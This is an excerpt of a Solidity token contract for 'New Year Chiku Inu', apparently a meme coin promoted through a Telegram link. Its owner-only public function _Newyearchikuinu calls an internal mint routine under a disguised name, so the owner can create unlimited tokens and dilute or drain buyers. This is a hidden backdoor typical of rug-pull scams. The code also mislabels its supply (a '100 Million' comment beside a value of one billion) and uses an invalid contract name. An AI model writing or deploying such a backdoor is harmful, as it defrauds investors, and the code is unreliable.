...
//
// $NewYearChikuInu proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/NewYearChikuInu
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Newyearchikuinu(uint256 amount) public onlyOwner {
 _Newyearchikuinu(msg.sender, amount);
    }
    ...
    function _Newyearchikuinu(address account, uint256 amount) internal virtual {
...
contract $NewYearChikuInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("New Year Chiku Inu", "NEWYEARCHIKUINU") {
        _Newyearchikuinu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}